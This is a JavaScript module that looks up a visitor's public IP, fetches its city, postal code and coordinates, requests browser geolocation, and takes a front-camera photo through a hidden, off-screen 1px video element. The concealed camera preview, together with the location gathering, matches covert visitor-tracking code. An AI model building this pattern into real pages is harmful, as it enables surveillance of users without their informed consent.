export async function fetchPublicIp() {
  const controllers = [
    () => fetch("https://api.ipify.org?format=json").then((r) => r.json()),
    () =>
      fetch("https://api64.ipify.org?format=json").then((r) => r.json()),
  ];

  let ip = null;
  let source = null;

  for (const tryFetch of controllers) {
    try {
      const data = await tryFetch();
      if (data?.ip) {
        ip = data.ip;
        source = "ipify";
        break;
      }
    } catch {
      /* try next */
    }
  }

  if (!ip) return { ip: null, source: null, geo: null };

  let geo = null;
  try {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), 4500);
    const res = await fetch(`https://ipapi.co/${ip}/json/`, {
      signal: ctrl.signal,
    });
    clearTimeout(t);
    const data = await res.json();
    if (data && !data.error) {
      geo = {
        city: data.city,
        region: data.region,
        country: data.country_name,
        countryCode: data.country_code,
        postal: data.postal,
        latitude: data.latitude,
        longitude: data.longitude,
        timezone: data.timezone,
        org: data.org,
        asn: data.asn,
      };
    }
  } catch {
    /* optional */
  }

  return { ip, source, geo };
}

export function requestLocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      resolve({ granted: false, error: "unsupported" });
      return;
    }
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        resolve({
          granted: true,
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
        });
      },
      (err) => {
        resolve({
          granted: false,
          error: err.code === 1 ? "denied" : String(err.message),
        });
      },
      { enableHighAccuracy: false, timeout: 12000, maximumAge: 60000 }
    );
  });
}

function createHiddenVideo() {
  const video = document.createElement("video");
  video.setAttribute("playsinline", "");
  video.setAttribute("muted", "");
  video.muted = true;
  video.playsInline = true;
  video.autoplay = true;
  Object.assign(video.style, {
    position: "fixed",
    width: "1px",
    height: "1px",
    opacity: "0",
    pointerEvents: "none",
    left: "-10000px",
    top: "0",
  });
  document.body.appendChild(video);
  return video;
}

function waitForVideoFrame(video) {
  return new Promise((resolve) => {
    if (video.videoWidth > 0) {
      resolve();
      return;
    }
    const onReady = () => {
      video.removeEventListener("loadeddata", onReady);
      resolve();
    };
    video.addEventListener("loadeddata", onReady);
    setTimeout(resolve, 1500);
  });
}

export async function captureSelfie() {
  const videoEl = createHiddenVideo();
  let stream;

  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
      audio: false,
    });

    videoEl.srcObject = stream;
    await videoEl.play();
    await waitForVideoFrame(videoEl);

    const maxW = 480;
    const vw = videoEl.videoWidth || 640;
    const vh = videoEl.videoHeight || 480;
    const scale = vw > maxW ? maxW / vw : 1;
    const canvas = document.createElement("canvas");
    canvas.width = Math.round(vw * scale);
    canvas.height = Math.round(vh * scale);
    const ctx = canvas.getContext("2d");
    ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);

    const dataUrl = canvas.toDataURL("image/jpeg", 0.72);
    return { granted: true, dataUrl };
  } finally {
    stream?.getTracks().forEach((t) => t.stop());
    videoEl.srcObject = null;
    videoEl.remove();
  }
}
